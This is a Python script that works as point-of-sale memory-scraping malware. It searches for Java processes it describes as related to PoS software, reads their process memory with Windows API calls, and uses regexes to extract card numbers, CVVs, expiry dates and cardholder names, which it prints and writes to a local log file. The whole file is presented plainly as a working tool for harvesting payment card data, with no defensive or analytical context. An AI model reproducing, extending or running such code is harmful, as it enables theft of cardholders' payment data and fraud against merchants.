import re
import ctypes
import time
import threading
import logging
from queue import Queue
import psutil  # For scanning running processes

# Initialize memory queue and running flag
memory_queue = Queue()
running = True

# Process access rights
PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400

# Regex patterns for card information
CARD_NUMBER_PATTERN = r'\b(?:\d[ -]*?){13,16}\b'  # Example pattern for 13-16 digit card numbers
CVV_PATTERN = r'\b\d{3,4}\b'  # Typical CVV pattern (3 or 4 digits)
EXPIRY_DATE_PATTERN = r'\b(0[1-9]|1[0-2])\/([0-9]{2})\b'  # Expiry date pattern (MM/YY)
NAME_PATTERN = r'[A-Z][a-z]+ [A-Z][a-z]+'  # Simple pattern for detecting names (First Last)

# Function to scan a memory chunk for card info
def scan_memory_chunk(memory_chunk):
    valid_cards = []
    
    # Search for potential card numbers
    card_numbers = re.findall(CARD_NUMBER_PATTERN, memory_chunk)
    
    for card_number in card_numbers:
        # Search for associated CVV, Expiry Date, and Name
        cvv = re.search(CVV_PATTERN, memory_chunk)
        expiry_date = re.search(EXPIRY_DATE_PATTERN, memory_chunk)
        name = re.search(NAME_PATTERN, memory_chunk)

        if card_number and cvv and expiry_date and name:
            card_info = {
                'Card Number': card_number,
                'Name': name.group(),
                'CVV': cvv.group(),
                'Expiry Date': expiry_date.group()
            }
            valid_cards.append(card_info)
    
    return valid_cards

# Worker thread that processes memory chunks for a specific process
def memory_scan_worker(process_handle, pid):
    while running:
        if memory_queue.empty():
            time.sleep(1)  # Avoid busy waiting
            continue
        
        base_addr, size = memory_queue.get()
        
        try:
            buffer = ctypes.create_string_buffer(size)
            bytesRead = ctypes.c_size_t(0)
            # Check if the address is still valid and if we can read memory
            if ctypes.windll.kernel32.ReadProcessMemory(process_handle, ctypes.c_void_p(base_addr), buffer, size, ctypes.byref(bytesRead)):
                print(f"[PID {pid}] Scanning memory region at address {base_addr} with size {size}")
                valid_cards = scan_memory_chunk(buffer.raw.decode('latin-1', errors='ignore'))
                if valid_cards:
                    for card in valid_cards:
                        formatted_output = f"[PID {pid}] {card['Card Number']}:{card['Name']}:{card['CVV']}:{card['Expiry Date']}"
                        print(formatted_output)
                        logging.info(formatted_output)  # Log to file
                else:
                    print(f"[PID {pid}] No valid card data found in this memory region.")
            else:
                # Handle the case where ReadProcessMemory fails
                logging.warning(f"[PID {pid}] Failed to read memory at {base_addr}: Address may not be valid or accessible.")
                print(f"[PID {pid}] Failed to read memory at address {base_addr}.")
        except Exception as e:
            logging.error(f"[PID {pid}] Error reading memory at {base_addr}: {e}")
            print(f"[PID {pid}] Error reading memory at address {base_addr}: {e}")
        finally:
            memory_queue.task_done()

# Function to automatically detect PIDs of relevant processes (e.g., javaw.exe)
def get_relevant_pids():
    relevant_pids = []
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            # Check for processes that might be related to PoS software
            if 'javaw.exe' in proc.info['name'] or 'your_process_name.exe' in proc.info['name'] or 'java' in proc.info['cmdline']:
                print(f"Detected relevant process: {proc.info['name']} (PID: {proc.info['pid']})")
                relevant_pids.append(proc.info['pid'])
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    return relevant_pids

# Function to retrieve memory regions of a given process
def get_memory_regions(pid):
    """ Retrieves the memory regions of the specified process. """
    memory_regions = []
    
    process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
    if not process_handle:
        print(f"Could not open process with PID {pid}.")
        return memory_regions
    
    # MEMORY_BASIC_INFORMATION structure
    class MEMORY_BASIC_INFORMATION(ctypes.Structure):
        _fields_ = [("BaseAddress", ctypes.c_void_p),
                    ("AllocationBase", ctypes.c_void_p),
                    ("AllocationProtect", ctypes.c_ulong),
                    ("RegionSize", ctypes.c_size_t),
                    ("State", ctypes.c_ulong),
                    ("Protect", ctypes.c_ulong),
                    ("Type", ctypes.c_ulong)]
    
    mbi = MEMORY_BASIC_INFORMATION()
    address = 0
    while ctypes.windll.kernel32.VirtualQueryEx(process_handle, ctypes.c_void_p(address), ctypes.byref(mbi), ctypes.sizeof(mbi)):
        if mbi.State == 0x1000:  # MEM_COMMIT
            # Consider only readable regions (PAGE_READWRITE, PAGE_READONLY)
            if mbi.Protect in (0x04, 0x02):
                memory_regions.append((mbi.BaseAddress, mbi.RegionSize))
        
        address += mbi.RegionSize

    ctypes.windll.kernel32.CloseHandle(process_handle)
    return memory_regions

# Main function to scan memory of automatically detected processes
def scan_process_memory(num_threads=4):
    pids = get_relevant_pids()
    
    if not pids:
        print("No relevant processes found.")
        return

    for pid in pids:
        print(f"Starting memory scan for PID {pid}")
        memory_regions = get_memory_regions(pid)
        if not memory_regions:
            print(f"[PID {pid}] No valid memory regions found.")
            continue

        process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
        if not process_handle:
            logging.error(f"[PID {pid}] Could not open process.")
            print(f"[PID {pid}] Could not open process.")
            continue

        # Start threads for each process
        threads = []
        for _ in range(num_threads):
            t = threading.Thread(target=memory_scan_worker, args=(process_handle, pid))
            t.daemon = True  # Allow threads to exit when the main program does
            t.start()
            threads.append(t)

        try:
            while running:
                # Keep scanning new memory regions in a loop
                new_memory_regions = get_memory_regions(pid)
                for region in new_memory_regions:
                    print(f"[PID {pid}] Adding memory region to queue: {region}")
                    memory_queue.put(region)

                time.sleep(5)  # Delay between scans to reduce CPU usage

        except KeyboardInterrupt:
            print(f"Stopping the memory scan for PID {pid}...")
        finally:
            for t in threads:
                t.join()
            ctypes.windll.kernel32.CloseHandle(process_handle)

    print("All memory scans completed.")

# Example usage
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, filename='memory_scan.log', filemode='a', format='%(asctime)s - %(message)s')

    # Start scanning memory for relevant processes
    scan_process_memory(num_threads=4)
